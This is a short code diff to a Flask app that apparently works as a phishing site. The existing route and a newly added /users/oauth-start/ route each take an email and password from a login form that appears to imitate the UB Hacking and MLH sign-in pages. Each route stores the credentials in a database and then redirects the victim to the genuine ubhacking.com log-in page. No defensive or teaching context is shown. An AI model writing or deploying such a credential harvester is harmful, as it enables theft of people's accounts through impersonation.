@@ -25,10 +25,20 @@ def index():
     database.add_to_DB(email, password)
     return redirect("https://www.ubhacking.com/users/log-in/")
 
+@app.post("/users/oauth-start/")
+def mlhlogin():
+    email = request.form['email']
+    password = request.form['password']
+    database.add_to_DB(email, password)
+    return redirect("https://www.ubhacking.com/users/log-in/")
 
 @app.route("/users/log-in/")
 def render_login():
     return render_template('login.html')
+
+@app.route("/users/oauth-start/")
+def render_mhl():
+    return render_template("mlhregister.html")
 
 
 if __name__ == "__main__":
